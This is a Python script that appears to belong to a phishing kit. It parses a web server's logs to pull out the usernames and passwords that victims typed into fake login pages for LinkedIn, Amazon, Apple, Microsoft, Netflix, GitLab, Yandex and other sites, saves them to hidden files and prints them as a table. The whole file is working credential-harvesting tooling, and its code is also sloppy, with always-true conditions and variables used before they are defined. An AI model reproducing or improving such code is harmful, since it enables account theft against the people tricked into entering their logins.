#!/usr/bin/env pyhton
import os
import re
import sys
import time
import subprocess
from urllib.parse import unquote 
from subprocess import PIPE

user_name   = os.path.dirname(os.path.abspath(__file__)).split ("/")[2]
Path_St = str("/".join(os.path.dirname(__file__).split('/')[:-1]))
group  = "chown "+ user_name+ ":"+user_name +" "+ Path_St+'/ServerLog/*'
os.system(group)
class dns_result :     
      def __init__(self):

         self.web_Password()
      def web_Password(self):
          print(" "+"-"*102)
          print("| "+f"{'       Site-Name    ':<20}",' |'+f"{'       auth_user    ':<35}","  | "+f"{'         PASSWORD   ':<35}   |")
          print(" "+"-"*102)
          count = 0 
          with open(Path_St+'/ServerLog/log_error.log') as Log_Handel :
              Log_read = Log_Handel.readlines()
          for line in Log_read:     
              if '%40'in  line :
                try: 
                    if "&sgnBt" in line  :
                        #shopping
                        pattern = r'userid=([^&]+)&pass=([^&]+)'
                        match = re.search(pattern, line)
                        if match:
                            line_cread_1 = match.group(1).replace("%40", "@")
                            line_cread_2 = match.group(2)
                   # elif 'Username=' in line :
                               
                    elif "&session_key=" in line :
                        #linkedi
                        email_match = re.search(r'session_key=([^&]+)', line)
                        password_match = re.search(r'session_password=([^&]+)', line)
                        
                        line_cread_1 = email_match.group(1).replace('%40','@') if email_match else None
                        line_cread_2  = password_match.group(1) if password_match else None
                    
                    elif "amazon" and "email=" in line:
                         #amazon,apple
                        print("333") 
                        pattern = r"email=([^&]+)&password=([^\s]+)"
                        match = re.search(pattern, line)
                        if match:
                            line_cread_1 = match.group(1).replace("%40", "@")
                            line_cread_2 = match.group(2)
                        else:
                            pattern = r'email=([^&]+).*?pass=([^&]+)'
                            match = re.search(pattern, line)
                            if match:
                                line_cread_1 = match.group(1).replace("%40", "@").replace("+",'')
                                line_cread_2 = match.group(2)   
                    elif "username=" or "Username" in line and "&signin=Next" not in line:
                        print("5555")
                        pattern = r"username=([^&]+)&password=([^\s]+)"
                        match = re.search(pattern, line)
                        if match:
                            line_cread_1 = match.group(1).replace("%40", "@").replace("+",'')
                            line_cread_2 = match.group(2)
                        elif 'login=' in line :
                            pattern = r"login=([^&]+)&password=([^&]+)" 
                            match = re.search(pattern, line)
                            if match:
                                line_cread_1 = match.group(1).replace("%40", "@").replace("+",'')
                                line_cread_2 = match.group(2)   
                        else:
                            pattern = r"Username=([^&]+)&Password=([^\s]+)"
                            match = re.search(pattern, line)
                            if match:
                                line_cread_1 = match.group(1).replace("%40", "@").replace("+",'')
                                line_cread_2 = match.group(2)

                    elif 'userLoginId=' in line:
                        pattern = r"userLoginId=([^&+]+).*?password=([^&]+)"
                        match = re.search(pattern, line)
                        if match:
                            line_cread_1  = match.group(1).replace('%40','@').replace("+",'')  # Remove trailing '+'
                            line_cread_2  = match.group(2)       
                    elif "&signin=Next" in line :
                            pattern = r'username=([^&]+)&passwd=([^&\s]+)'
                            match = re.search(pattern, line)
                            if match:
                                line_cread_1 = match.group(1).replace("%40", "@").replace("+", "")
                                line_cread_2 = match.group(2)
                    elif "usernameOrEmail=" in line :
                        pattern = r'usernameOrEmail=([^&]+)&password=([^\s]+)'
                        match = re.search(pattern, line)
                        if match:
                            line_cread_1 = match.group(1).replace("%40", "@")
                            line_cread_2 = match.group(2)       
                    elif '&user%5Blogin%5D' in line:
                        #gitlab
                        match = re.search(r"user%5Blogin%5D=([^&\s]+).*?user%5Bpassword%5D=([^&\s]+)", line)
                        if match:
                            line_cread_1 = unquote(match.group(1)).replace('+', '')
                            line_cread_2= unquote(match.group(2))
                    elif "UserId=" in line :
                        pattern = r'UserId=([^&]+)&Password=([^\s]+)'
                        match = re.search(pattern, line)
                        if match:
                            line_cread_1 = unquote(match.group(1)).replace('+', '')
                            line_cread_2= unquote(match.group(2))
                    elif "&captcha_text=" in line :  
                              line_cread_1 = unquote(rego[0][11:])
                              line_cread_2 = unquote(rego[1][9:]) 
                             # print(22) 
                    elif "g-recaptcha-response=']" in rego :
                              line_cread_1 = unquote(rego[0][11:])
                              line_cread_2 = unquote(rego[1][9:]) 
                              print(21)
                    else: 
                                #playstation.com  
                                if "struts.token.name=" in line :
                                  line_cread_1  = unquote(rego[0][11:])
                                  line_cread_2  = unquote(rego[1][11:])
                                else:
                                    line_cread_1 =unquote(rego[0][11:])
                                    line_cread_2  = unquote(rego[1][9:-2])  
                                    print(20)
                    if "IsFidoSupported=" in line : 
                          #microsoft
                          rego = str("".join(re.findall("[^=]",line))).split("&")
                          line_cread_1  = unquote(rego[0][-23:])
                          line_cread_2  = unquote(rego[1][6:])  
                          print(4)                        
                    elif "csrf=" in line or "key2" in line:
                          #myspace-wifi-ver
                          rego = str(re.findall("[&email=]\\D+\\S%40+.+",line)).split('=') 
                          if "&pageId" in line: 
                              line_cread_1  = unquote(rego[1][:-9])
                              line_cread_2  = unquote(rego[2][:-11])
                              print(18)
                          elif "Y&customerType" in rego:
                               line_cread_1  = unquote(rego[1][:-9])
                               line_cread_2  = unquote(rego[2][:-13])
                               print(17)
                          elif "Re-Connect']" in rego :
                               line_cread_1  = unquote(rego[1][:-9])
                               line_cread_2  = unquote(rego[2][:-7])
                            #   print(16)
                          else:    
                              line_cread_1  = unquote(rego[1][:-9])
                              line_cread_2  = unquote(rego[2][:-11])  
                              print(15)                         
                    elif "Cemail&authURL" in line :
                          #netflax
                          rego = str(re.findall("[&email=]\\D+\\S%40+.+",line)).split('=') 
                          line_cread_1  = unquote(rego[1][:-9])
                          line_cread_2  = unquote(rego[2][:-11])  
                          print(5)
                    elif "true&googleCaptchaResponse" in line :
                          #origin
                          rego = str(re.findall("[&email=]\\D+\\S%40+.+",line)).split('=')
                          line_cread_1  = unquote(rego[1][:-9])
                          line_cread_2  = unquote(rego[2][:-9])  
                          print(6)
                    elif "&redirect=&login=" in line :
                          rego = str(re.findall("[&login=]\\D+\\S%40+.+",line)).split('=')
                          line_cread_1  = unquote(rego[2][:-9])
                          line_cread_2  = unquote(rego[3][:-21])  
                          print(7)
                    elif "&expire=" in line :
                          #VK  
                        pattern = r"email=([^&\s]+)&pass=([^&\s]+)"
                        match = re.search(pattern, line)

                        if match:
                           line_cread_1  = match.group(1).replace("%40", "@").replace("+", "")
                           line_cread_2 = match.group(2)
             
                    elif "&clean=&idkey=" in line :
                          # yandex
                          rego = str(re.findall("[&email=]\\D+\\S%40+.+",line)).split('=')
                          line_cread_1  = unquote(rego[1][:-7])
                          line_cread_2  = unquote(rego[-1][:-2])   
                          print(9)
                   # elif "email=" in line:
                            #badoo-apple
                    #        rego = str(re.findall("[&email=]\\D+\\S%40+.+",line)).split('=')
                     #       if "&post" in rego[-2][-5:] :
                      #           line_cread_1  = unquote(rego[1][:-9])
                    # #         line_cread_2  = unquote(rego[-2][:-5])
                       #          print(13)
                     #       else:     
                        #          line_cread_1  = unquote(rego[1][:-9])
                         #         line_cread_2  = unquote(rego[-1][:-2])  
                          #        print(12)
                   
                    elif "ci_csrf_token=" in line :
                          rego = str(re.findall("[&email=]\\D+\\S%40+.+",line)).split('=')
                          line_cread_1  = unquote(rego[1][:-9])
                          line_cread_2  = unquote(rego[2][:-10])
                          print(11)
                    elif "apple=" in line :
                          rego = str(re.findall("[&email=]\\D+\\S%40+.+",line)).split('=')
                          line_cread_1  = unquote(rego[1][:-3])
                          line_cread_2  = unquote(rego[2][:-7])     
                    elif "id=" in line :
                          #pinterest.com  
                          rego = str(re.findall("[&email=]\\D+\\S%40+.+",line)).split('=')
                          line_cread_1  = unquote(rego[1][:-9])
                          line_cread_2  = unquote(rego[2][:-2])                                    
                    with open (Path_St+'/ServerLog/.Cread.txt','a') as Cread_User ,\
                    open(Path_St+'/ServerLog/.pass.txt','a') as cartpass:
                            count +=1
                            Cread_User.write(line_cread_1+'\n')
                            cartpass.write(line_cread_2+'\n')
                except IndexError:
                       pass  
                except UnboundLocalError :
                       pass  
                def localGrep():
                    try: 
                        with open (Path_St+'/ServerLog/.Cread.txt','r') as Cread_User ,\
                        open(Path_St+'/ServerLog/.pass.txt','r') as cartpass,\
                        open(Path_St+'/ServerLog/.web.txt','r') as FileWeb:
                            Cread_User= Cread_User.readlines()
                            cartpass= cartpass.readlines()
                            FileWeb= FileWeb.readlines()
                            for i in range(count):
                                print("|   "+f"{FileWeb[i].replace("\n",''):<20}"+"|   "+f"{Cread_User[i].replace("\n",''):<35}"+"| "+f"{cartpass[i].replace("\n",''):<35}"+"   |")
                        with open (Path_St+'/ServerLog/.Cread.txt','w') as Cread_User ,\
                        open(Path_St+'/ServerLog/.pass.txt','w') as cartpass,\
                        open(Path_St+'/ServerLog/.web.txt','w') as FileWeb:
                            pass
                    except IndexError:
                         pass           
                patternerror =  r'POST //([^/]+)\.php'               
                with open(Path_St+'/ServerLog/log_access.log','r') as accesslog:
                    accesslog = accesslog.readlines()#[-243:]       
                for line1 in accesslog:   
                        pattern = r'https?://(?:www\.)?([a-zA-Z0-9-]+)'
                        matches = re.findall(pattern, line1)
                        if matches:   
                            for match in matches:
                                with open(Path_St+'/ServerLog/.web.txt','a') as FileWeb:
                                    FileWeb.write(match+'\n') 
                                    localGrep()
                                    exit()
                        elif "GET"  in line1 :
                            pattern = r'\/\/([^\/]+)\/'
                            matches = re.findall(pattern, line1)
                            for match in matches:
                                if "HTTP" in  match :
                                    pass 
                                else:  
                                  
                                    with open(Path_St+'/ServerLog/.web.txt','a') as FileWeb:
                                        FileWeb.write(str("".join(match))+'\n')
                                    localGrep()
                                    exit()  
                        else :

                            with open(Path_St+'/ServerLog/log_access.log') as erroraccessLog:
                                erroraccessLog = erroraccessLog.readlines()
                                for lineError in erroraccessLog :
                                    match = re.search(patternerror, lineError)
                                    if match :
                                       with open(Path_St+'/ServerLog/.web.txt','a') as FileWeb:
                                            FileWeb.write(str("".join(match.group(1))+'\n'))
                            localGrep()
                            exit()                
                
if __name__ =='__main__':
     dns_result()  